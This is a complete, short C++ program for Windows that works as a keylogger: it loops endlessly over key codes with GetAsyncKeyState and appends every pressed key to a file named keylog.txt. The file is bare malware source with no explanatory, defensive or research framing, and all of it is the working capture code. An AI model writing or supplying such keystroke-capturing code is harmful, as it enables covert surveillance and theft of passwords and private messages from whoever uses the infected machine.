#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

void logKey(char key) {
    ofstream logFile;
    logFile.open("keylog.txt", ios_base::app);
    logFile << key;
    logFile.close();
}

int main() {
    char key;
    while (true) {
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(key);
            }
        }
    }
    return 0;
}
